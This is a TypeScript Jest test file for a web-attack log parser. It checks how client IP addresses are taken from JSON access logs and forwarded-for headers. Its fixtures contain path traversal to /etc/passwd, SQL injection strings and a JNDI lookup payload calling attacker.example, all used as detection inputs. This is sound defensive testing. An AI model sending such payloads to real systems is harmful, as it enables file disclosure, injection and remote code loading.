import { describe, expect, test } from "@jest/globals";
import { JSONObject } from "../../../../Types/JSON";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import { SECURITY_REQUEST_ATTRIBUTES } from "../../../../Types/SecurityEvent/SecurityEventRequestOutcome";
import {
  ClientAddressTrust,
  TrustedProxies,
  readClaimedClientAddress,
  readClientAddressTrust,
  toTrustedProxies,
} from "../../../../Utils/SecurityEvent/ClientAddressTrust";
import WebAttackLogParser, {
  JSON_CLIENT_FIELDS,
  readJsonAccessLog,
  readJsonLineClient,
} from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import { readHiddenClientAddress } from "../../../../Utils/SecurityEvent/ScrubbedAddress";
import { NOT_WEB_ATTACKS, WEB_LINES, logLine } from "./LogParserFixtures";

/*
 * A JSON ACCESS LOG'S CLIENT IS ITS OWN CLIENT FIELD (#10486).
 *
 * A JSON access log with no client field used to fall back to the free-text
 * reader over its whole text, request included, so a query parameter, a
 * referrer or a user agent named the client:
 *
 *   {"request":"GET /download?ip=198.51.100.9&file=../../etc/passwd HTTP/1.1","status":"404"}
 *
 * made 198.51.100.9 - an address the sender chose - the address to block.
 * Now a JSON line's client is read from its own fields alone, which name it
 * the ways people's shapes do. And its X-Forwarded-For, when it records
 * one, says only whether a proxy the project trusts forwarded the client's
 * address: what the sender wrote there is a claim (#10416).
 */

function parseOne(
  body: string,
  options: { trustedProxies?: TrustedProxies } = {},
): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = WebAttackLogParser.parse({
    ...logLine(body),
    trustedProxies: options.trustedProxies,
  });

  expect(events).toHaveLength(1);

  return events[0]!;
}

function json(record: JSONObject): string {
  return JSON.stringify(record);
}

describe("a JSON access log with no client field", () => {
  test("names no client from the request the sender wrote (the issue's line)", () => {
    const event: NormalizedSecurityEvent = parseOne(
      '{"request":"GET /download?ip=198.51.100.9&file=../../etc/passwd HTTP/1.1","status":"404"}',
    );

    expect(event.principalIp).toBe("");
    expect(event.observables).not.toContain("198.51.100.9");
    expect(readHiddenClientAddress(event)).toBeNull();
    expect(readClaimedClientAddress(event)).toBeNull();
  });

  test("nor from a referrer, a user agent, a header or a path", () => {
    for (const record of [
      {
        request: "GET /search?q=1' or 1=1 HTTP/1.1",
        http_referer: "https://example.com/?from=198.51.100.9",
      },
      {
        request: "GET /search?q=1' or 1=1 HTTP/1.1",
        http_user_agent: "client 198.51.100.10 scanner",
      },
      {
        uri: "/x/src=198.51.100.11/../../etc/passwd",
        method: "GET",
      },
      {
        request: "GET /?x=${jndi:ldap://attacker.example/a} HTTP/1.1",
        headers: { "X-Real-IP": "198.51.100.12" },
      },
      {
        request: "GET /static/../../etc/passwd HTTP/1.1",
        // A forwarded-for header is the sender's, and a client field it is not.
        http_x_forwarded_for: "198.51.100.13",
      },
    ]) {
      const event: NormalizedSecurityEvent = parseOne(json(record));

      expect({ record, principalIp: event.principalIp }).toEqual({
        record,
        principalIp: "",
      });
    }
  });

  test("a JSON line that is no access log names its client from its own fields only, too", () => {
    expect(
      parseOne(
        json({
          level: "warn",
          msg: "Page not found - /x?ip=198.51.100.9&id=1' or 1=1",
        }),
      ).principalIp,
    ).toBe("");

    expect(
      parseOne(
        json({
          level: "warn",
          msg: "Page not found - /x?ip=198.51.100.9&id=1' or 1=1",
          client_ip: "203.0.113.9",
        }),
      ).principalIp,
    ).toBe("203.0.113.9");

    expect(readJsonLineClient(json({ msg: "from 198.51.100.9" }))).toEqual({
      clientIp: "",
    });
    expect(readJsonLineClient("not json")).toBeNull();
    expect(readJsonLineClient("[1, 2]")).toBeNull();
  });
});

describe("a JSON access log with a client field", () => {
  test('names "src_ip" and the other labels people use', () => {
    const cases: ReadonlyArray<[JSONObject, string]> = [
      [{ src_ip: "203.0.113.7" }, "203.0.113.7"],
      [{ source_ip: "203.0.113.8" }, "203.0.113.8"],
      [{ client_addr: "203.0.113.9:51234" }, "203.0.113.9"],
      [{ remote_address: "203.0.113.10" }, "203.0.113.10"],
      [{ remoteAddress: "::ffff:203.0.113.11" }, "203.0.113.11"],
      [{ source: { address: "203.0.113.12" } }, "203.0.113.12"],
      [{ "source.address": "203.0.113.13" }, "203.0.113.13"],
      [{ "client.address": "203.0.113.14" }, "203.0.113.14"],
      [{ request: { remote_ip: "203.0.113.15" } }, "203.0.113.15"],
      [{ httpRequest: { remoteIp: "203.0.113.16" } }, "203.0.113.16"],
      [{ ClientHost: "203.0.113.17" }, "203.0.113.17"],
      [{ downstream_remote_address: "[2001:db8::18]:443" }, "2001:db8::18"],
      // A field that holds a word is passed over for one that holds an address.
      [{ source: "web", client: "203.0.113.19" }, "203.0.113.19"],
    ];

    for (const [fields, address] of cases) {
      const record: JSONObject = {
        ...fields,
        uri: "/static/../../etc/passwd",
        status: 404,
      };

      expect({
        record,
        principalIp: parseOne(json(record)).principalIp,
      }).toEqual({ record, principalIp: address });
    }
  });

  test("every JSON access log fixture keeps its client", () => {
    expect(parseOne(WEB_LINES.jsonAccessLog).principalIp).toBe("203.0.113.43");
    expect(
      readJsonAccessLog(
        json({ client_ip: "203.0.113.46", method: "put", uri: "/a" }),
      )?.clientIp,
    ).toBe("203.0.113.46");
    // Not an attack: no event at all, as before.
    expect(WebAttackLogParser.parse(logLine(NOT_WEB_ATTACKS[1]!))).toEqual([]);
  });

  test("its fields are read most telling first", () => {
    expect(JSON_CLIENT_FIELDS.indexOf("remote_addr")).toBe(0);
    expect(JSON_CLIENT_FIELDS.indexOf("ip")).toBe(
      JSON_CLIENT_FIELDS.length - 1,
    );
    expect(JSON_CLIENT_FIELDS).not.toContain("x_forwarded_for");
    expect(JSON_CLIENT_FIELDS).not.toContain("http_x_forwarded_for");
  });
});

describe("a JSON access log's X-Forwarded-For (#10416)", () => {
  const ATTACK: JSONObject = {
    request: "GET /static/../../etc/passwd HTTP/1.1",
    status: "404",
  };

  test("through a peer the project does not trust, the peer is blamed and the header a claim", () => {
    const event: NormalizedSecurityEvent = parseOne(
      json({
        ...ATTACK,
        remote_addr: "203.0.113.7",
        http_x_forwarded_for: "192.0.2.44",
      }),
    );

    expect(event.principalIp).toBe("203.0.113.7");
    expect(readClientAddressTrust(event)).toBe(ClientAddressTrust.Peer);
    expect(readClaimedClientAddress(event)).toEqual({
      address: "192.0.2.44",
      scrubbedKind: null,
      from: "x-forwarded-for",
      isOnlyAddress: false,
    });
  });

  test("through a private load balancer, the hop it appended is blamed", () => {
    const event: NormalizedSecurityEvent = parseOne(
      json({
        ...ATTACK,
        remote_addr: "10.0.0.5",
        http_x_forwarded_for: "192.0.2.44, 203.0.113.7",
      }),
    );

    expect(event.principalIp).toBe("203.0.113.7");
    expect(event.observables).toContain("203.0.113.7");
    expect(event.observables).not.toContain("192.0.2.44");
    expect(readClientAddressTrust(event)).toBe(ClientAddressTrust.TrustedProxy);
    expect(readClaimedClientAddress(event)?.address).toBe("192.0.2.44");
  });

  test("Caddy's header map, as a list of values, is read the same", () => {
    const event: NormalizedSecurityEvent = parseOne(
      json({
        request: {
          remote_ip: "10.0.0.5",
          uri: "/static/../../etc/passwd",
          method: "GET",
          headers: { "X-Forwarded-For": ["192.0.2.44", "198.51.100.23"] },
        },
        status: 404,
      }),
    );

    expect(event.principalIp).toBe("198.51.100.23");
  });

  test("a Forwarded header only claims, even through a trusted proxy", () => {
    const event: NormalizedSecurityEvent = parseOne(
      json({
        ...ATTACK,
        remote_addr: "10.0.0.5",
        http_forwarded: "for=192.0.2.44",
      }),
    );

    expect(event.principalIp).toBe("");
    expect(readClientAddressTrust(event)).toBe(ClientAddressTrust.Claimed);
    expect(readClaimedClientAddress(event)).toEqual({
      address: "192.0.2.44",
      scrubbedKind: null,
      from: "forwarded",
      isOnlyAddress: true,
    });
    expect(
      event.attributes[SECURITY_REQUEST_ATTRIBUTES.clientAddress],
    ).toBeUndefined();
  });

  test("an edge the project trusts vouches for the address it forwarded", () => {
    const record: string = json({
      ...ATTACK,
      remote_addr: "172.70.38.12",
      http_x_forwarded_for: "198.51.100.23",
    });

    expect(parseOne(record).principalIp).toBe("172.70.38.12");
    expect(
      parseOne(record, { trustedProxies: toTrustedProxies("172.64.0.0/13") })
        .principalIp,
    ).toBe("198.51.100.23");
  });

  test("a client field a scrub rule hid stays hidden, and what came through is never the client", () => {
    const event: NormalizedSecurityEvent = parseOne(
      json({ ...ATTACK, remote_addr: "[REDACTED]" }),
    );

    expect(event.principalIp).toBe("");
    expect(readHiddenClientAddress(event)?.value).toBe("[REDACTED]");
  });
});
